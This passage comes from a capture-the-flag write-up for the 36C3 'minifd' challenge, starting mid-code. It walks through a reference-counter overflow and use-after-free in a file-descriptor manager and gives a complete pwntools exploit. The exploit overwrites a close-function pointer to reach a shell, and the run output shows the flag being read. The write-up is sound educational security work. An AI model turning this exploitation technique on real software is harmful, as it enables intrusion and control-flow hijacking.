  free(p_ctx);
  return;
}
```
We can see two bugs in the implementation above. For the first bug, let's take a look at how the handlers are called from the program loop above:
```c
iVar1 = __isoc99_sscanf(user_input,"close %d",&file_fd);
if (iVar1 == 1) {
  uVar3 = do_close(file_fd);
  if ((int)uVar3 == 0) {
    __printf_chk(1,"Closed file with file descriptor: %d\n",(ulong)file_fd);
  }
  else {
    __printf_chk(1,"Error: File with fd %d could not be closed\n",(ulong)file_fd);
  }
}
```
This is an example for `close`, but other functions behave in the same way. As you can see, the `fd` is received from the user and passed on to the handler without validating bounds. It is then used in order to access the `files` array. This means that the user can input any integer (positive or negative) and cause the program to treat an arbitrary 8-byte aligned address as a pointer to a file context. However, I couldn't find a way to exploit this in the given program.
The other bug is much easier to exploit. Let's take another look at the duplication handler. We'll refactor it a bit and inline `c3ctf_file_dup` for the sake of readability:
```c
pfVar1 = files[file_fd];
if (pfVar1 == NULL)
{
  return -1;
}
pfVar1->reference_count += 1;
for (i = 0; i  ")
def print_list(proc):
    read_menu(proc)
    proc.sendline("list")
    return proc.recvuntil(ENTER_CMD, drop = True)
def create(proc, name):
    read_menu(proc)
    proc.sendline("create {}".format(name))
    resp = proc.recvline()
    if "Error" in resp:
        raise Exception(resp)
    new_fd = resp.split(": ")[1].rstrip()
    log.info("File '{}' created with fd {}".format(name, new_fd))
    return new_fd
def close(proc, fd):
    read_menu(proc)
    proc.sendline("close {}".format(fd))
    log.info("Closing file with fd {}".format(fd))
def dup(proc, fd):
    read_menu(proc)
    proc.sendline("dup {}".format(fd))
    resp = proc.recvline()
    if "Error" in resp:
        raise Exception(resp)
    new_fd = resp.split(": ")[1].rstrip()
    log.info("File with fd {} duplicated, new fd: {}".format(fd, new_fd))
    return new_fd
def read(proc, fd, n):
    read_menu(proc)
    proc.sendline("read {} {}".format(fd, n))
    log.info("Reading {} bytes from fd {}".format(n, fd))
    resp = proc.recvline()
    return proc.recvuntil(ENTER_CMD, drop = True) 
def write(proc, fd, n, data):
    read_menu(proc)
    proc.sendline("write {} {} {}".format(fd, n, data))
    log.info("Writing {} bytes to fd {}:\n{}".format(n, fd, hexdump(data)))
    resp = proc.recvline()
    return proc.recvuntil(ENTER_CMD, drop = True) 
def exit(proc):
    read_menu(proc)
    proc.sendline("exit")
    log.info("Quitting...")
log.info("Address of spawn_shell(): {}".format(hex(exe.symbols['spawn_shell'])))
io = start()
opening_text = read_opening_text(io)
match = re.search(r"At this point of time, only (\d+) files can be managed at the same time.", opening_text)
num_files = int(match.group(1))
file0 = create(io, "file_0")
file1 = create(io, "file_1")
file0_dup = dup(io, file0)
for i in range(num_files - len([file0, file0_dup, file1])):
    create(io, "filler_{}".format(i))
# Overflow reference counter for file_0 (current reference count is 2)
num_duplications = UINT8_MAX
for i in range(num_duplications):
    try:
        dup(io, file0)
    except:
        pass
log.info("Attempted to duplicate fd {} for {} times".format(file0, num_duplications))
# Reference counter is now 1
close(io, file0)
fc = file_context_t.from_buffer_copy('A' * ctypes.sizeof(file_context_t))
fc.p_close_func = exe.symbols['spawn_shell']
write(io, file1, ctypes.sizeof(fc), fc.to_bytes())
close(io, file0_dup)
io.interactive()
```
Output:
```console
root@kali:/media/sf_CTFs/36c3/minifd# python exploit.py
[*] '/media/sf_CTFs/36c3/minifd/fd'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
[*] Address of spawn_shell(): 0x400e9e
[+] Starting local process '/media/sf_CTFs/36c3/minifd/fd': pid 1739
[*] File 'file_0' created with fd 0
[*] File 'file_1' created with fd 1
[*] File with fd 0 duplicated, new fd: 2
[*] File 'filler_0' created with fd 3
[*] File 'filler_1' created with fd 4
[*] File 'filler_2' created with fd 5
[*] File 'filler_3' created with fd 6
[*] File 'filler_4' created with fd 7
[*] File 'filler_5' created with fd 8
[*] File 'filler_6' created with fd 9
[*] File 'filler_7' created with fd 10
[*] File 'filler_8' created with fd 11
[*] File 'filler_9' created with fd 12
[*] File 'filler_10' created with fd 13
[*] File 'filler_11' created with fd 14
[*] File 'filler_12' created with fd 15
[*] Attempted to duplicate fd 0 for 255 times
[*] Closing file with fd 0
[*] Writing 80 bytes to fd 1:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000030  9e 0e 40 00  00 00 00 00  41 41 41 41  41 41 41 41  │··@·│····│AAAA│AAAA│
    00000040  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    00000050
[*] Closing file with fd 2
[*] Switching to interactive mode
$ cat flag.txt
junior-pwned_after_the_ctf_was_over
$ exit
[*] Got EOF while reading in interactive
$
[*] Process '/media/sf_CTFs/36c3/minifd/fd' stopped with exit code 0 (pid 1739)
[*] Got EOF while sending in interactive
```
Bonus: While debugging the exploit with GDB, it's very convenient to use be able to view the file context as a logical structure. However, the structure definition was stripped from the binary. The solution (obtained from [here](https://stackoverflow.com/questions/7272558/can-we-define-a-new-data-type-in-a-gdb-session/7273785#7273785)) is to compile a fake `C` file and take the symbols from there:
```console
root@kali:/media/sf_CTFs/36c3/minifd# cat src.c
#import 
typedef struct file_context {
    uint8_t     reference_count;
    uint8_t     reserved[3];
    uint32_t    data_length;
    uint8_t*    p_data;
    char        name[32];
    void*       p_close_func;
    void*       p_read_func;
    void*       p_write_func;
    void*       p_dup_func;
} file_context_t;
file_context_t dummy;
root@kali:/media/sf_CTFs/36c3/minifd# gcc -g -c src.c
root@kali:/media/sf_CTFs/36c3/minifd#
```
Then:
```
gdb-peda$ add-symbol-file src.o 0
add symbol table from file "src.o" at
	.text_addr = 0x0
Reading symbols from src.o...done.
gdb-peda$ p *((file_context_t*[16])files)[2]
$3 = {
  reference_count = 0x1, 
  reserved = "\000\000", 
  data_length = 0x0, 
  p_data = 0x0, 
  name = "file_0", '\000' , 
  p_close_func = 0x4008ab , 
  p_read_func = 0x4008d0 , 
  p_write_func = 0x4008f1 , 
  p_dup_func = 0x4008a7 
}
```